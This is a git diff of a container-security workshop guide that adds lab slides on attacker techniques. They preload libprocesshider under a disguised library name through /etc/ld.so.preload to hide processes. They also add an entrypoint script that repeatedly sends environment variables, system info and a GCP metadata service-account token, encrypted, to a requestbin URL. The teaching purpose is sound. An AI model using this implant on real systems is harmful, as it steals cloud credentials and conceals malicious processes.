@@ -201,7 +201,7 @@ ls /tmp/*.jar
 ```
 vim /tmp/app.jar
 ```
-Remember `ESC :wq` to exit from vim/view
+Remember `[ESC]` then `:wq` to exit from vim/view
 
 Now that we've extracted the jar, we can remove the container. Use same container id from a few commands ago for command below.
 ```
@@ -317,7 +317,7 @@ ENV UA "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEc
 ENV USER HANDLE
 ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
 ```
-> After pasting, hit `ESC`, then type `:wq`
+> After pasting, hit `[ESC]`, then type `:wq`
 
 
 ### Slide 49 - Create an entrypoint script
@@ -512,9 +512,173 @@ to this (use `i` to enter insert mode in vi):
 ```
 static const char* process_to_filter = "sleep";
 ```
-> After changing, hit `ESC`, then type `:wq`
+> After changing, hit `[ESC]`, then type `:wq`
 
 Compile:
 ```
 make
 ```
+
+### Slide 64 - Libprocess hider lab (cont.)
+
+```
+cd ..
+```
+We're going to update the Dockerfile from our cmddemo to do more things
+```
+vi Dockerfile
+```
+We're going to add 4 new lines
+
+>Reminder about vi: `i` for insert mode to edit text, use arrow keys to navigate, `[ESC]` to exit insert mode, `:wq` to save(write to file) and quit
+
+Between these two lines
+```
+RUN apt update && apt upgrade -y && apt install -y curl tini
+COPY ./docker-entrypoint.sh /docker-entrypoint.sh
+```
+Add:
+```
+COPY ./libprocesshider/libprocesshider.so /usr/local/lib/libso5.so
+RUN echo "/usr/local/lib/libso5.so" >> /etc/ld.so.preload
+```
+This copies in the library we just compiled and adds an entry to the ld.so.preload file to load it during "preload"
+
+Between these two lines
+```
+ENV USER HANDLE
+ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
+```
+add and replace PASSWORD with one you made up:
+```
+# Replace password with a unique one of your own
+ENV PW PASSWORD
+```
+
+When is all done, your Dockerfile should look like this.
+
+```
+FROM ubuntu:20.04
+RUN groupadd -g 999 usertest && \
+useradd -r -u 999 -g usertest usertest
+RUN apt update && apt upgrade -y && apt install -y curl tini
+COPY ./libprocesshider/libprocesshider.so /usr/local/lib/libso5.so
+RUN echo "/usr/local/lib/libso5.so" >> /etc/ld.so.preload
+COPY ./docker-entrypoint.sh /docker-entrypoint.sh
+RUN chmod +x /docker-entrypoint.sh
+USER usertest
+# Go to requestbin.net and get a public url and replace below
+ENV URL REQUESTBIN_URL
+ENV UA "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7"
+# Replace HANDLE with your l33t hacker name or some other identifying designation
+ENV USER HANDLE
+# Replace password with a unique one of your own
+ENV PW PASSWORD
+ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
+```
+> After pasting, hit `[ESC]`, then type `:wq`
+
+### Slide 65 - Libprocess hider lab (cont.)
+
+>`[ESC]` then type `:wq` if you haven't already from last slide
+
+We're also going to edit the docker-entrypoint.sh file, it's easier to just replace the whole thing.
+```
+vi docker-entrypoint.sh
+```
+
+>vi Tip: just hit `dd` repeatedly to delete whole lines, then go into insert mode and paste the contents below
+```
+#!/usr/bin/env bash
+
+if [ "shell" = "${1}" ]; then
+  /bin/bash
+else
+ while true
+ do
+    sleep 30
+    curl -s  -X POST -A "${UA}" -H "X-User: ${HANDLE}" -H "Cookie: `uname -a | gzip | base64 -w0`" -d \
+`{ env && curl -s -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token; } | gzip | openssl enc -e -aes-256-cbc -md sha512 -pbkdf2 -salt -a -pass "pass:${PW}" | base64 -w0` \
+$URL
+    echo
+ done
+fi
+```
+
+This adds a little more data to our exfil, we'll go over this.
+
+> After pasting, hit `[ESC]`, then type `:wq`
+
+### Slide 66 - Libprocess hider lab (cont.)
+
+>`[ESC]` then type `:wq` if you haven't already from last slide
+
+Rebuild the container
+```
+docker build -t cmddemo .
+```
+
+Run the container in the background(detached) and just give us the container id (`-d` aka `--detach`)
+```
+docker run -d cmddemo
+```
+
+After 30 seconds, you should see a new request on your requestbin tab (that hopefully you kept open). If not create a new public requestbin, re-edit your Dockerfile, replace the environment variable value with the new one, rebuild, and re-run the container.
+
+### Slide 67 - Libprocess hider lab (cont.)
+
+Decrypt and decode the new data in the raw output of the requestbin request that came in. Replace `[DATA]` with the base64 string from it in the command below. Don't forget to replace `[strong password]` in the command below with the one you set in the Dockerfile.
+
+```
+base64 -d <<< [DATA] \
+| openssl enc -d -aes-256-cbc -md sha512 -pbkdf2 -a -salt -pass "pass:[strong password]" \
+| gunzip
+```
+
+What do you see? Why would this information be useful to an attacker?
+
+Let's test out the libprocesshider
+
+```
+docker ps
+```
+Use id/name in to replace `[container name/id]` in command below
+```
+docker exec [container name/id] ps auxf
+```
+Where's the sleep process?
+
+Run the process list outside the container/namespace.
+```
+ps auxf |grep systemd
+```
+There it is, why isn't it hiding the process outside the namespace?
+
+Stop the container (running in background) now that we're done with it. 
+```
+docker stop [container name/id]
+```
+
+### Slide 76 - Clean ups
+
+```
+docker system df
+```
+
+```
+docker system prune
+```
+
+```
+docker container prune
+```
+
+## Module 4 - Container IR - GL,HF.
+
+### Slide 69 - NOICE
+```
+docker image pull digitalshokunin/webserver
+```
+
+## Module 5 - Kubernetes 101
+
